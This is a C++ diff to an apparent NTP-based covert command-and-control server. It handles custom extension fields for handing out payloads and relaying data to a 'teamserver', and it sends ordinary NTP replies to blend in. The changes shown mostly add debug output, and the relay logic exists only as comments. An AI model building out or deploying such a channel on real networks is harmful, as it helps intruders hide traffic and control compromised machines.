@@ -72,16 +72,20 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         return;
     }
 
-    print_packet_hex(data, len);
-
     //Extract extension field
     NTPPacketParser ntpPacket(packet);
     std::vector<uint8_t> ntpPacketExtension = ntpPacket.getExtension();
     std::array<uint8_t, 2> ntpPacketExtensionField = ntpPacket.getExtensionField();
+    //standard here: print debug header of packet type, then printthe packet
 
     //2. Do different actions based on what type of packet/extension field is coming in
     if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
-        std::cout << "Give Me Payload " << std::endl;
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: Give Me Payload " << std::endl;
+        std::cout << "----------------------" << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
+
+
     }
 
     /*
@@ -92,10 +96,14 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 
     */
     else if (ntpPacketExtensionField == NtpExtensionField::dataForTeamserver) {
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: dataForTeamserver " << std::endl;
+        std::cout << "----------------------" << std::endl;
         //this is data meant for teamserver. Need to fogure out chunkinghere too
 
         //identify session here too?
         std::cout << "sendDataToTeamserver " << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
 
         //send to teamserver
 
@@ -104,26 +112,19 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         //send data back with header of NtpExtensionField::dataFromTeamserver
     }
 
-    /* GiveMePayload
-    
-    
-    When the client wants the payload, teh server will go grab it from the teamserver
-
-
-    */
-    else if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
-        std::cout << "Give Me Payload " << std::endl;
-    }
-
     else {
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: Unknown " << std::endl;
+        std::cout << "----------------------" << std::endl;
         std::cout << "[?] Packet extension did not match any known extensions" << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
 
         //if none of the headers match,s end back regular NTP packet
                 //send back a default packet
         NTPPacket defaultPacket;
         std::vector<uint8_t> defaultPacketData = defaultPacket.getPacket();
 
-        std::cout << "[?] Sending normal NTP packet back" << std::endl;
+        std::cout << "[?] Sending normal NTP packet back:" << std::endl;
         printHexVectorPacket(defaultPacketData);
 
         sendto(sock,
